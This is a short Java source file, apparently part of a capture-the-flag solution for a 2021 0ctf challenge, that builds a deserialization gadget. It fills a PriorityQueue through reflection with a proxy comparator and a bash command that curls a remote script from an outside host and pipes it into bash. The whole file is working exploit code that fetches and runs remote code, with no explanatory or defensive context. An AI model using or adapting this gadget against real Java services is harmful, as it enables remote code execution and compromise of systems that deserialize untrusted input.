package evil;

import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.PriorityQueue;

public class Gadget {
    public static Object get() throws Exception {
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>();
        priorityQueue.add("");
        priorityQueue.add("");
        Field field = PriorityQueue.class.getDeclaredField("queue");
        field.setAccessible(true);
        Object[] array = (Object[]) field.get(priorityQueue);
        array[0] = Proxy.newProxyInstance(
                Thread.currentThread().getContextClassLoader(),
                new Class[]{Comparable.class},
                new com.yxxx.Gadget()
        );
        array[1] = new String[]{"bash", "-c",
                "curl -s http://spider:8080/?url=https://tmp.ceclin.top/0ctf-2021-2rm1/cmd | bash"};
        return priorityQueue;
    }
}
